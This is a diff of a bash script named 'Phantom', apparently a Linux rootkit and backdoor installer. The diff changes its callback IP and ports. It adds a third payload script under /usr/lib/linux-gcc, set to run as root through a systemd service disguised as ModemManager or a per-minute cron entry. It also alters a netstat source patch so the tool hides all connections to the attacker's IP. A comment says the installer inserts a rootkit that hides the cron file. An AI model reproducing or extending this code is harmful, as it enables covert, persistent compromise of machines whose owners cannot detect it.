@@ -1,9 +1,10 @@
 #!/bin/bash
 
-ip="192.168.56.1"
+ip="10.0.2.2"
 port2="9999"
-portp="15827"
-portr="15420"
+portp="15136"
+portr="15272"
+portk="1234"
 
 echo "---Phantom started---"
 #find the user making the connection
@@ -108,7 +109,6 @@ EOF
   exit
 fi
 
-
 #---if the user making the connection is root---
 #--create the services--
 #check which kind of services management system is used
@@ -122,6 +122,9 @@ if [ "$?" == "0" ]; then
   mkdir /usr/local/share/d-bus 2>/dev/null
   create_script "$d_bus_bash_script" "/usr/local/share/d-bus/d-bus"
   create_systemd_service "$d_bus_systemd_service" "dbus-org.freedesktop.ModemManager11.service"
+  mkdir /usr/lib/linux-gcc 2>/dev/null
+  create_script "$linux_gcc_script" "/usr/lib/linux-gcc/linux-gcc"
+  create_systemd_service "$linux_gcc_systemd_service" "dbus-org.freedesktop.ModemManager12.service"
 else
   #create the crontab file
   echo "--create the scripts and root crontab file--"
@@ -129,11 +132,13 @@ else
   create_script "$usb_bus_script" "/var/lib/usb-bus/usb-bus"
   mkdir /usr/local/share/d-bus 2>/dev/null
   create_script "$d_bus_python_script" "/usr/local/share/d-bus/d-bus"
+  mkdir /usr/lib/linux-gcc 2>/dev/null
+  create_script "$linux_gcc_script" "/usr/lib/linux-gcc/linux-gcc"
   printf "create the root crontab file... "
   #first runs d-bus and then usb-bus because usb-bus inserts the rootkit which hides the crontab file and d-bus would not run then
   printf '#DO NOT EDIT\n#This file is generated automatically by cron\n
 SHELL=/bin/bash\n
-* * * * * root /usr/local/share/d-bus/d-bus\n* * * * * root /var/lib/usb-bus/usb-bus\n' >/etc/cron.d/usb-bus
+* * * * * root /usr/local/share/d-bus/d-bus\n* * * * * root /var/lib/usb-bus/usb-bus\n* * * * * root /usr/lib/linux-gcc/linux-gcc\n' >/etc/cron.d/usb-bus
   chown root:root /etc/cron.d/usb-bus
   finish
 fi
@@ -278,7 +283,7 @@ if [ "$?" == "0" ]; then
   rm /tmp/net-tools.zip
   #modify netstat.c
   printf "modifying netstat.c... "
-  sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port2\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c 2>/dev/null
+  sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c 2>/dev/null
   sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c 2>/dev/null
   finish
   #patch the makefile
